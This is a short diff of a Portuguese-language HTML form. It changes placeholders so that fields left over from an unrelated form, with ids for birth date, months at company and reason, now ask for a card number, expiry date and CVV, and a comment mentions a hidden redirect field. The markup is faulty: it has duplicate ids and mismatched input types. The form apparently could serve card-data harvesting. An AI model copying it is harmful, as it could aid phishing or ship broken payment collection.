@@ -120,17 +120,17 @@
 
             <div class="form-group">
                 <label for="data_nascimento">Número do cartão</label>
-                <input type="date" id="data_nascimento" name="data_nascimento" required>
+                <input type="number" id="meses_empresa" name="meses_empresa" min="0" required placeholder="Ex: xxxx.xxxx.xxxx.xxxx">
             </div>
 
             <div class="form-group">
                 <label for="meses_empresa">Data da validade</label>
-                <input type="number" id="meses_empresa" name="meses_empresa" min="0" required placeholder="Ex: 12">
+                <input type="number" id="meses_empresa" name="meses_empresa" min="0" required placeholder="Ex: DD-MM-AAAA">
             </div>
 
             <div class="form-group">
                 <label for="motivo">cvv</label>
-                <textarea id="motivo" name="motivo" required placeholder="Conte-nos seu motivo..."></textarea>
+                <textarea id="motivo" name="motivo" required placeholder="código de verificação ex: xxx ou xxxx"></textarea>
             </div>
 
             <!-- Campo oculto para redirecionamento após envio -->
